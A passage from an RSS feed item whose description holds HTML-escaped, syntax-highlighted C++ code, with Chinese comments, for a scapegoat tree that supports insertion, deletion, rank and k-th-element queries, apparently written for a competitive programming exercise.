(1&amp;lt;&amp;lt;30)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; maxn (2100000)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; db double&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; il inline&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; RG register&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;using&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;namespace&lt;/span&gt; std;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; db al=&lt;span class=&#34;number&#34;&gt;0.75&lt;/span&gt;;&lt;span class=&#34;comment&#34;&gt;//α&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;node&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; son[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;],fa,size,num;&lt;span class=&#34;comment&#34;&gt;//左右孩子储存地址，节点父亲，以该节点为根子树的重量，该节点储存的数字&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125; t[maxn];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; n,cnt,root;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;il &lt;span class=&#34;type&#34;&gt;bool&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;balance&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(RG &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; id)&lt;/span&gt;   &lt;span class=&#34;comment&#34;&gt;//判断子树是否平衡&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; (db)(t[id].size*al&amp;gt;=(db)t[ t[id].son[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] ].size) &amp;amp;&amp;amp; (db)( t[id].size*al&amp;gt;=(db)t[t[ id].son[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;] ].size);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; cur[maxn],sum;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;il &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;recycle&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(RG &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; id)&lt;/span&gt;    &lt;span class=&#34;comment&#34;&gt;//压扁，把需要重构的子树拎出来先拍扁成序列&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(t[id].son[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]) &lt;span class=&#34;built_in&#34;&gt;recycle&lt;/span&gt;(t[id].son[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cur[++sum]=id;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(t[id].son[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]) &lt;span class=&#34;built_in&#34;&gt;recycle&lt;/span&gt;(t[id].son[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;il &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;build&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(RG &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; l,RG &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; r)&lt;/span&gt;   &lt;span class=&#34;comment&#34;&gt;//递归建树，使结构最优&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(l&amp;gt;r) &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    RG &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; mid=(l+r)&amp;gt;&amp;gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,id=cur[mid];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    t[ t[id].son[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]=&lt;span class=&#34;built_in&#34;&gt;build&lt;/span&gt;(l,mid&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;) ].fa=id;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    t[ t[id].son[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]=&lt;span class=&#34;built_in&#34;&gt;build&lt;/span&gt;(mid+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,r) ].fa=id;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    t[id].size=t[ t[id].son[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] ].size+t[ t[id].son[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;] ].size+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; id;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;il &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;rebuild&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(RG &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; id)&lt;/span&gt;   &lt;span class=&#34;comment&#34;&gt;//重构子树，再“接回去”&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sum=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;recycle&lt;/span&gt;(id);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    RG &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; fa=t[id].fa,Son=( t[ t[id].fa ].son[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]==id );&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    RG &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; cur=&lt;span class=&#34;built_in&#34;&gt;build&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,sum);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    t[ t[fa].son[Son]=cur ].fa=fa;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(id==root) root=cur;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;il &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;insert&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(RG &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; x)&lt;/span&gt;&lt;span class=&#34;comment&#34;&gt;//插入一个数字x&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    RG &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; now=root,cur=++cnt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    t[cur].size=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,t[cur].num=x;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) &amp;#123; &lt;span class=&#34;comment&#34;&gt;//找到适合位置插入&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        t[now].size++;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        RG &lt;span class=&#34;type&#34;&gt;bool&lt;/span&gt; Son=(x&amp;gt;=t[now].num);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;( t[now].son[Son] ) now=t[now].son[Son];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            t[ t[now].son[Son]=cur ].fa=now;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    RG &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; flag=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;(RG &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i=cur; i; i=t[i].fa) &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(!&lt;span class=&#34;built_in&#34;&gt;balance&lt;/span&gt;(i)) flag=i;&lt;span class=&#34;comment&#34;&gt;//注意：重建时取深度最浅的，以避免小子树重构完大子树还重构，浪费时间&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(flag) &lt;span class=&#34;built_in&#34;&gt;rebuild&lt;/span&gt;(flag); &lt;span class=&#34;comment&#34;&gt;//插入往往会导致不平衡,这时需要重建不平衡的子树即可&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;il &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;get_num&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(RG &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; x)&lt;/span&gt;   &lt;span class=&#34;comment&#34;&gt;//查询 x 在树中的节点编号（在数组中储存位置下标）&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    RG &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; now=root;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(t[now].num==x) &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; now;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; now=t[now].son[ t[now].num&amp;lt;x ];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;il &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;erase&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(RG &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; id)&lt;/span&gt;   &lt;span class=&#34;comment&#34;&gt;//删除&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(t[id].son[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] &amp;amp;&amp;amp; t[id].son[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        RG &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; cur=t[id].son[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt;(t[cur].son[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]) cur=t[cur].son[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        t[id].num=t[cur].num;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        id=cur;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125; &lt;span class=&#34;comment&#34;&gt;//删除操作需要找到左子树的最后一个节点或右子树的第一个节点来顶替,优先找左子树&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    RG &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; Son=(t[id].son[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]) ? t[id].son[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]:t[id].son[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    RG &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; k=( t[ t[id].fa ].son[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]==id );&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    t[ t[ t[id].fa ].son[k]=Son ].fa=t[id].fa;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;(RG &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i=t[id].fa; i; i=t[i].fa) t[i].size--;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(id==root) root=Son;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;il &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;get_rank&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(RG &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; x)&lt;/span&gt;   &lt;span class=&#34;comment&#34;&gt;//查 x 的排名&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    RG &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; now=root,ans=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt;(now) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(t[now].num&amp;lt;x) ans+=t[ t[now].son[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] ].size+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,now=t[now].son[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; now=t[now].son[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; ans;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;il &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;get_kth&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(RG &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; x)&lt;/span&gt;   &lt;span class=&#34;comment&#34;&gt;//查树中的第 k 个数&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    RG &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; now=root;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(t[ t[now].son[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] ].size==x&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;) &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; now;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(t[ t[now].son[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] ].size&amp;gt;=x) now=t[now].son[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; x-=t[ t[now].son[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] ].size+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,now=t[now].son[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; now;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cnt=&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,root=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    t[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;].num=-inf,t[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;].size=&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,t[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;].son[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]=&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    t[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;].num=inf,t[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;].size=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,t[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;].fa=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;scanf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d&amp;quot;&lt;/span&gt;,&amp;amp;n);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    RG &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; type,x;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;(RG &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;; i&amp;lt;=n; i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;scanf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d%d&amp;quot;&lt;/span&gt;,&amp;amp;type,&amp;amp;x);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(type==&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) &lt;span class=&#34;built_in&#34;&gt;insert&lt;/span&gt;(x);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(type==&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;) &lt;span class=&#34;built_in&#34;&gt;erase&lt;/span&gt;( &lt;span class=&#34;built_in&#34;&gt;get_num&lt;/span&gt;(x) );&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(type==&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;) &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d\n&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;get_rank&lt;/span&gt;(x));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(type==&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;) &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d\n&amp;quot;&lt;/span&gt;,t[ &lt;span class=&#34;built_in&#34;&gt;get_kth&lt;/span&gt;(x+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) ].num);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(type==&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;) &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d\n&amp;quot;&lt;/span&gt;,t[&lt;span class=&#34;built_in&#34;&gt;get_kth&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;get_rank&lt;/span&gt;(x))].num);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(type==&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;) &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d\n&amp;quot;&lt;/span&gt;,t[&lt;span class=&#34;built_in&#34;&gt;get_kth&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;get_rank&lt;/span&gt;(x+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)].num);&lt;span class=&#34;comment&#34;&gt;//注意此处 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt; ]]></description>
        </item>
        <item>
